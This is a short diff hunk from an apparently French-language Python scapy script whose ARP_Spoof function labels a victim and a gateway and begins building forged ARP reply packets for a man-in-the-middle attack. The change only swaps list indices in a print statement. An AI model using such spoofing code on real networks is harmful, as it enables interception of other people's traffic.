@@ -21,7 +21,7 @@ def ARP_Spoof(Network = str):
         MAC.append(ans[i][0].hwsrc)
         IP.append(ans[i][0].psrc)
 
-    print("[*]VICTIME : Adresse Mac ",MAC[0],", IP  ",IP[0],"\n [*]GATEWAY : Adresse Mac ",MAC[1]," IP ",IP[1])
+    print("[*]VICTIME : Adresse Mac ",MAC[1],", IP  ",IP[1],"\n [*]GATEWAY : Adresse Mac ",MAC[2]," IP ",IP[2])
     
     def spoof(ip_1 , ip_2): 
         packet = scapy.ARP(op = 2, pdst = ip_1, hwdst = MAC[1], psrc = ip_2)
